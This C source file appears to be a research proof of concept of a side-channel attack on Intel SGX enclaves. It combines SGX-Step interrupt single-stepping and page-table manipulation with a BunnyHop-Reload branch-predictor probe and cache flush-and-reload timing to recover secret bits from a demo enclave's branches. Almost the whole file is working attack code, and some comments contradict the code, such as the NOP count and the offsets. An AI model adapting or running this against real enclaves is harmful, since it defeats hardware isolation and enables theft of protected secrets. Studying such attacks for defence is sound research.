#include <sgx_urts.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <assemblyline.h>

#include "Enclave/encl_u.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/cache.h"


/* ============================================================
 * BRANCH INFO — from objdump
 *   0x10bf: je 0x10c6     (the if(bits[i]) branch)
 *   0x10c1: call secret_function  (bit=1 path)
 *   0x10c6: inc rdi               (bit=0 path, branch taken)
 *
 * BTB stores: branch at 0x10bf → target 0x10c6
 * So predicted_target = enclave_base + 0x10c6
 *
 * Cache HIT  after spy = BTB had entry = branch WAS taken = bit 0
 * Cache MISS after spy = BTB no entry  = branch NOT taken = bit 1
 * ============================================================ */

#define BRANCH_OFFSET           0x401c   /* je — where we trigger */
#define SPY_ALIAS_OFFSET        0x401e   /* call — what we alias spy to */
#define PREDICTED_TARGET_OFFSET 0x3000   /* secret_function page */

/* secret the enclave processes */
#define SECRET_LEN 8
static uint8_t secret_bits[SECRET_LEN] = {1, 0, 1, 1, 0, 1, 0, 0};
uint64_t raw_cycles[SECRET_LEN] = {0};
/* cache threshold: below = hit, above = miss (cycles) */
#define CACHE_THRESHOLD 100

/* LOW_MASK and PAGEMASK from bunnyhop source */
#define LOW_MASK  0xFFFFFFFFULL
#define PAGEMASK  0xFFFULL
#define PAGELEN   4096

/* ===================== globals ===================== */
sgx_enclave_id_t eid  = 0;
int irq_cnt           = 0;
int do_irq            = 1;
uint64_t *pte_encl    = NULL;
uint64_t *pmd_encl    = NULL;

uint64_t branch_addr  = 0;
void    *predicted_target = NULL;
void   (*spy_func)(void)  = NULL;

int recovered[SECRET_LEN];
int rec_idx           = 0;
int waiting_for_result = 0;

uint64_t spy_alias_addr = 0;   /* aliased to the call, not the je */

#define MAX_LOG 20
uint64_t log_offset[MAX_LOG];
uint64_t log_cycles[MAX_LOG];
int      log_spy_result[MAX_LOG];
int      log_idx = 0;








/* ===================== AssemblyLine spy setup ===================== */

/*
 * Maps a page at (adrs & LOW_MASK) — keeping the lower 32 bits
 * so that (adrs & 0xFFFFFFFF) is preserved in the mapped address.
 */
static void *create_buffer(uint64_t adrs, int size) {
    /* lower 32 bits we need to preserve */
    uint64_t lower32 = adrs & 0xFFFFFFFFULL;
    /* page offset within that */
    uint64_t page_offset = adrs & PAGEMASK;
    /* page-aligned lower 32 bits */
    uint64_t page_lower32 = lower32 & ~PAGEMASK;

    /* try different upper 32 bits until we find a free page */
    for (uint64_t upper = 0x100000000ULL;
         upper < 0x700000000000ULL;
         upper += 0x100000000ULL) {

        uint64_t try_addr = upper | page_lower32;

        /* skip if it overlaps with enclave memory */
        uint64_t enc_base = (uint64_t)get_enclave_base();
        if (try_addr >= enc_base && try_addr < enc_base + 0x200000)
            continue;

        void *buffer = mmap(
            (void *)try_addr,
            size,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE | MAP_POPULATE,
            -1, 0
        );

        if (buffer != MAP_FAILED) {
            info("spy buffer mapped at %p (page_offset=0x%lx)", buffer, page_offset);
            return buffer;
        }
    }

    printf("create_buffer: all mmap attempts failed for adrs=%#lx\n", adrs);
    return NULL;
}
/*
 * Replicates genspy() from bunnyhop.c
 * Places N NOPs + RET at the aliased address using AssemblyLine.
 * The function pointer returned points to exactly (adrs & PAGEMASK)
 * within the mapped page — matching the lower 12 bits of the target.
 */
static void (*genspy(uint64_t adrs, int size, int nop_count))(void) {
    void *buffer = create_buffer(adrs, size);
    if (!buffer) return NULL;

    /* AssemblyLine instance writing into buffer at the page offset */
    assemblyline_t al = asm_create_instance(
        buffer + (adrs & PAGEMASK), size
    );

    for (int i = 0; i < nop_count; i++)
        asm_assemble_str(al, "NOP");
    asm_assemble_str(al, "RET");

    void (*func)(void) = asm_get_code(al);
    asm_destroy_instance(al);
    return func;
}

/* ===================== BunnyHop-Reload probe ===================== */

static inline void bhop_flush(void *addr) {
    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
    asm volatile("mfence"       ::: "memory");
}

/*
 * Reload timing: measure cycles to access predicted_target.
 * Returns 1 (cache hit = branch taken = bit 0) or
 *         0 (cache miss = branch not taken = bit 1)
 *
 * Note: hit means bit=0 because je taken means bits[i]==0.
 */
static inline int bhop_reload(void *addr) {
    uint64_t t1, t2;
    asm volatile (
        "mfence\n\t"
        "rdtsc\n\t"
        "shl $32, %%rdx\n\t"
        "or %%rdx, %%rax\n\t"
        "mov %%rax, %0\n\t"
        "mov (%2), %%rbx\n\t"
        "rdtsc\n\t"
        "shl $32, %%rdx\n\t"
        "or %%rdx, %%rax\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(t1), "=r"(t2)
        : "r"(addr)
        : "rax", "rbx", "rdx", "memory"
    );
    return (t2 - t1) < CACHE_THRESHOLD ? 1 : 0;
}

/* ===================== AEP handler ===================== */

void aep_cb_func(void) {
    uint64_t rip    = edbgrd_erip();
    uint64_t offset = rip - (uint64_t)get_enclave_base();

    /* keep 0x3000 cold AT ALL TIMES by flushing every step */
    bhop_flush(predicted_target);

    if (offset >= 0x4000 && offset <= 0x4040) {

        if (waiting_for_result && rec_idx < SECRET_LEN) {
            waiting_for_result = 0;

            spy_func();

        /* properly serialized timing */
        uint32_t lo, hi;
        uint64_t t1, t2;

        asm volatile (
            "mfence\n\t"
            "rdtsc\n\t"
            "lfence\n\t"
            "mov %%eax, %0\n\t"
            "mov %%edx, %1\n\t"
            : "=r"(lo), "=r"(hi) :: "eax", "edx", "memory"
        );
        t1 = ((uint64_t)hi << 32) | lo;

        *(volatile uint8_t *)predicted_target;

        asm volatile (
            "lfence\n\t"
            "rdtsc\n\t"
            "lfence\n\t"
            "mov %%eax, %0\n\t"
            "mov %%edx, %1\n\t"
            : "=r"(lo), "=r"(hi) :: "eax", "edx", "memory"
        );
        t2 = ((uint64_t)hi << 32) | lo;

        raw_cycles[rec_idx] = t2 - t1;
        recovered[rec_idx++] = (t2 - t1) < 200 ? 1 : 0;
        }

        if (rip == branch_addr) {
            spy_func();          /* evict BTB entry */
            waiting_for_result = 1;
        }
    }

    irq_cnt++;
    if (do_irq && irq_cnt > 500000)
        do_irq = 0;

    mark_enclave_exec_not_accessed();

    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
        flush(pmd_encl);
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
}

void fault_handler(int signal) {
    info("fault %d, restoring page perms", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
}

/* ===================== setup ===================== */

void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();
    register_enclave_info();
    print_enclave_info();
}

void attacker_config_page_table(void) {
    void *code_adrs = get_enclave_base();
    code_adrs += get_symbol_offset("ecall_process_bits");

    info("ecall_process_bits at %p", code_adrs);

spy_alias_addr = (uint64_t)get_enclave_base() + SPY_ALIAS_OFFSET;
info("spy alias addr   = %#lx", spy_alias_addr);

    branch_addr      = (uint64_t)get_enclave_base() + BRANCH_OFFSET;
    predicted_target = (void *)((uint64_t)get_enclave_base() + PREDICTED_TARGET_OFFSET);

    info("branch addr      = %#lx", branch_addr);
    info("predicted target = %p",   predicted_target);

    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
    ASSERT(PRESENT(*pte_encl));
    mark_enclave_exec_not_accessed();

    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    ASSERT(PRESENT(*pmd_encl));
}

void setup_spy(void) {
    /*
     * Spy must be placed at an address sharing lower 32 bits with branch_addr.
     * branch_addr lower 32 bits = 0x6ca010bf  (from our earlier calculation)
     *
     * LOW_MASK keeps bits [46:12], so mmap hint = branch_addr & LOW_MASK
     * The page offset (bits [11:0]) = branch_addr & PAGEMASK = 0x0bf
     * AssemblyLine writes spy code starting at buffer + 0x0bf
     *
     * 6 NOPs + RET = 7 bytes — fits easily within the page remainder.
     */
    info("setting up spy function at aliased address...");
    spy_func = genspy(spy_alias_addr, PAGELEN, 0);//changed to 0 from 6 to check
    ASSERT(spy_func != NULL);
    info("spy function placed at %p", (void *)spy_func);
    info("spy addr lower 32 bits = %#lx (should match branch lower 32 bits = %#lx)",
         (uint64_t)spy_func & 0xFFFFFFFFULL,
         spy_alias_addr & 0xFFFFFFFFULL);
}
void test_bunnyhop(void) {
    /* allocate two pages: trainer and probe */
    uint8_t *train_page = mmap(NULL, 4096,
        PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    uint8_t *target_page = mmap(NULL, 4096,
        PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    /* write JMP + NOPs + RET into train_page */
    /* JMP 6 bytes forward */
    train_page[0] = 0xEB; train_page[1] = 0x06;
    /* 6 NOPs */
    memset(train_page+2, 0x90, 6);
    /* RET */
    train_page[8] = 0xC3;

    /* write spy: 6 NOPs + RET at same lower 32 bits as train */
    uint64_t train_addr = (uint64_t)train_page;
    void (*local_spy)(void) = genspy(train_addr, 4096, 6);

    void (*train_func)(void) = (void(*)(void))train_page;

    info("train addr:  %p", train_page);
    info("spy addr:    %p", (void*)local_spy);
    info("target page: %p", target_page);
    info("lower32 train: %#lx", train_addr & 0xFFFFFFFF);
    info("lower32 spy:   %#lx", (uint64_t)local_spy & 0xFFFFFFFF);

    /* warm target into cache */
    *(volatile uint8_t*)target_page;

    /* train the BTB: call train_func which jumps to target */
    /* actually we need train to jump TO target_page */
    /* patch the JMP to point at target_page */
    int32_t jmp_offset = (int32_t)((uint64_t)target_page - ((uint64_t)train_page + 5));
    train_page[0] = 0xE9;
    memcpy(train_page+1, &jmp_offset, 4);
    train_page[5] = 0xC3; /* RET at target */
    *(uint8_t*)target_page = 0xC3; /* RET */

    /* train */
    train_func();

    /* flush target */
    asm volatile("clflush (%0)"::"r"(target_page):"memory");
    asm volatile("mfence":::"memory");

    /* measure BEFORE spy */
    uint32_t lo, hi; uint64_t t1, t2;
    asm volatile("mfence\nrdtsc\nlfence":"=a"(lo),"=d"(hi)::"memory");
    t1 = ((uint64_t)hi<<32)|lo;
    *(volatile uint8_t*)target_page;
    asm volatile("lfence\nrdtsc\nlfence":"=a"(lo),"=d"(hi)::"memory");
    t2 = ((uint64_t)hi<<32)|lo;
    info("before spy (should be COLD ~361): %lu", t2-t1);

    /* flush again, run spy */
    asm volatile("clflush (%0)"::"r"(target_page):"memory");
    asm volatile("mfence":::"memory");
    /* train BTB multiple times */
    for (int i = 0; i < 100; i++)
        train_func();

    /* flush target */
    asm volatile("clflush (%0)"::"r"(target_page):"memory");
    asm volatile("mfence":::"memory");

    /* spy */
    local_spy();


    /* measure AFTER spy */
    asm volatile("mfence\nrdtsc\nlfence":"=a"(lo),"=d"(hi)::"memory");
    t1 = ((uint64_t)hi<<32)|lo;
    *(volatile uint8_t*)target_page;
    asm volatile("lfence\nrdtsc\nlfence":"=a"(lo),"=d"(hi)::"memory");
    t2 = ((uint64_t)hi<<32)|lo;
    info("after spy  (should be HOT  ~83):  %lu", t2-t1);

    munmap(train_page, 4096);
    munmap(target_page, 4096);
}
/* ===================== main ===================== */

int main(int argc, char **argv) {
    sgx_launch_token_t token = {0};
    int updated = 0;
    idt_t idt = {0};

    /* test flush/reload timing with normal memory */
uint8_t *test_page = mmap(NULL, 4096,
    PROT_READ|PROT_WRITE,
    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    volatile uint8_t *p = test_page;

    /* warm it */
    *p;
    uint64_t t1, t2;
    asm volatile("mfence\nrdtsc\nshl $32,%%rdx\nor %%rdx,%%rax":"=a"(t1)::"rdx","memory");
    *p;
    asm volatile("mfence\nrdtsc\nshl $32,%%rdx\nor %%rdx,%%rax":"=a"(t2)::"rdx","memory");
    info("HOT access:  %lu cycles", t2-t1);

    /* flush and measure cold */
    asm volatile("clflush (%0)"::"r"(p):"memory");
    asm volatile("mfence":::"memory");
    asm volatile("mfence\nrdtsc\nshl $32,%%rdx\nor %%rdx,%%rax":"=a"(t1)::"rdx","memory");
    *p;
    asm volatile("mfence\nrdtsc\nshl $32,%%rdx\nor %%rdx,%%rax":"=a"(t2)::"rdx","memory");
    info("COLD access: %lu cycles", t2-t1);

    munmap(test_page, 4096);
    
    info_event("Creating enclave...");
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1,
                                  &token, &updated, &eid, NULL));

    /* dry run to page in enclave memory */
    info("Dry run...");
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* setup */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    setup_spy();                      /* ← set up aliased spy function */
    test_bunnyhop();
    register_aep_cb(aep_cb_func);

    info_event("Setting up APIC/IDT");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    __ss_irq_fired = 0;
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    while (!__ss_irq_fired);
    info("APIC timer working");

    /* run the attack */
    info_event("Single-stepping enclave with BunnyHop-Reload...");
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));


    info("=== detailed probe log ===");
    printf("bit | secret | offset | cycles_after_spy | cycles_before_spy\n");
    for (int i = 0; i < log_idx; i++) {
        printf(" %d  |   %d    | %#lx  |       %lu        |       %d\n",
            i, secret_bits[i], log_offset[i], 
            log_cycles[i], log_spy_result[i]);
    }

    /* results */
    info_event("Results:");
    printf("secret:    ");
    for (int i = 0; i < SECRET_LEN; i++) printf("%d ", secret_bits[i]);
    printf("\nrecovered: ");
    for (int i = 0; i < rec_idx; i++) printf("%d ", recovered[i]);
    printf("\ncycles:    ");
    for (int i = 0; i < rec_idx; i++) printf("%lu ", raw_cycles[i]);
    printf("\n");
    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("done. total IRQs: %d", irq_cnt);

    return 0;
}
